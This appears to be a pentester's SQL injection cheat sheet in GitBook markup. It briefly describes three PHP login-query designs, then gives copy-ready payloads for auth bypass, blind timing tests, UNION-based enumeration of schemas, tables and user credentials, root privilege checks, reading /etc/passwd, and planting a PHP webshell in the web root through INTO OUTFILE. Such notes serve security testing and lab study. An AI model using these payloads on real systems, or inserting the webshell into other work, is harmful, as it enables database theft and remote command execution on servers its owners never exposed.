---
icon: syringe
---

# SQLi

{% hint style="info" %}
### <mark style="color:green;">`Python`</mark>&#x20;

* <mark style="color:purple;">**Doesn't need**</mark>**&#x20;**<mark style="color:orange;">**`;`**</mark>**&#x20;**<mark style="color:purple;">**at the end.**</mark>

***

### <mark style="color:orange;">`PHP`</mark>

<mark style="color:purple;">Authentication Methods:</mark>

1. <mark style="color:red;">**`Querying for matching username and password`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">This method involves running an SQL query that looks for rows where both the</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password (or password hash)**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">match the user's input.</mark>
   * <mark style="color:purple;">If any rows are returned (meaning a match is found), the user is allowed to log in.</mark>
2. <mark style="color:red;">**`Ensuring exactly one result`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">The query looks for matching</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">and</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(or hash), but it only allows login if</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**exactly one result**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">is returned.</mark>
3. <mark style="color:red;">**`Querying based on username, then checking the password hash separately`**</mark><mark style="color:purple;">:</mark>
   * <mark style="color:purple;">Query the database based</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**only on the username**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">(without initially checking the password) and retrieving the user's</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**password hash**</mark> <mark style="color:purple;"></mark><mark style="color:purple;">from the database.</mark>
   * <mark style="color:purple;">Once the username is found, the password hash is compared to the one entered by the user.</mark>
{% endhint %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass" %}
Auth Bypass
{% endembed %}

***

{% hint style="info" %}
### <mark style="color:purple;">Recon</mark>

{% code title="Basic test" %}
```sql
' or 1=1-- -
```
{% endcode %}

{% code title="Test for blind injection" %}
```sql
' OR SLEEP(5) -- 
```
{% endcode %}

### <mark style="color:purple;">Union</mark>

* <mark style="color:purple;">Find the number of columns:</mark>

```sql
' order by 1-- -
```

```sql
' order by 1,2-- -
```

* <mark style="color:purple;">Detect the number of column using</mark> <mark style="color:orange;">**`Union`**</mark><mark style="color:purple;">:</mark>

```sql
' union select 1-- -
```

```sql
' union select 1,2-- -
```

```sql
' union select 1,2,3-- -
```

```sql
' union select 1,2,3,4-- -
```

* <mark style="color:purple;">Once you know the number of columns:</mark>

{% code title="Current database" %}
```sql
' union select 1,2,3,database()--
```
{% endcode %}

{% code title="Database version" %}
```sql
' UNION select 1,@@version,3,4-- -
```
{% endcode %}

{% code title="Current User" %}
```sql
' UNION SELECT 1,user(),3,4-- -
```
{% endcode %}

{% code title="Concatenation" overflow="wrap" %}
```sql
' union select 1,2,3,concat(column1, ':', column2, ':', column3, ':', column4) from user-- -
```
{% endcode %}

#### <mark style="color:orange;">`Information_schema`</mark>

* <mark style="color:purple;">If you want to know how many databases there are:</mark>

{% code title="Information Schema" overflow="wrap" %}
```sql
' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -
```
{% endcode %}

* <mark style="color:purple;">To look how many tables in a database:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'database'-- -
```
{% endcode %}

* <mark style="color:purple;">To look how many columns in a table:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = 'table'-- -
```
{% endcode %}

* <mark style="color:purple;">To look the content of the columns:</mark>

{% code overflow="wrap" %}
```sql
' union select 1,2,3,concat(column1, ':', column2, ':', column3, ':', column4) from user-- -
```
{% endcode %}

### <mark style="color:purple;">Privileges</mark>

{% code title="Checks admin privileges" overflow="wrap" %}
```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
{% endcode %}

{% code title=" Extracting privilege details of the root user" overflow="wrap" %}
```sql
' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
{% endcode %}

{% code title="Find which directories can be accessed" overflow="wrap" %}
```sql
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
{% endcode %}

### <mark style="color:purple;">File Injection</mark>

{% code title="Read local file" overflow="wrap" %}
```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
{% endcode %}

{% code title="Write a string to a local file" overflow="wrap" %}
```sql
`select 'file written successfully!' into outfile '/var/www/html/proof.txt
```
{% endcode %}

{% code title="Creates a webshell" overflow="wrap" %}
```sql
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
{% endcode %}
{% endhint %}

